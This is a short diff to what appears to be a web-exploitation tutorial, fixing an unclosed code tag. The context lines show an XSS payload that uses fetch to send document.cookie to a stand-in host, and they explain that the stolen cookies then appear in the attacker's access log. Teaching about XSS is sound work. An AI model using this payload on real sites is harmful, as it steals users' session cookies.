@@ -147,7 +147,7 @@ If you prefer running a web server for exfiltration locally, you can set up a si
 
 If the website you're exploiting allows AJAX requests (via connect-src) to anywhere, you can create a fetch request to your server like so:<br>
 
-- <code><script>fetch(`http://example.com/${document.cookie}`)</script><br>
+- <code><script>fetch(`http://example.com/${document.cookie}`)</script></code><br>
 
 When the script is triggered on the victim's machine, you'll see their cookies show up in your access log, like so:<br><br>
 
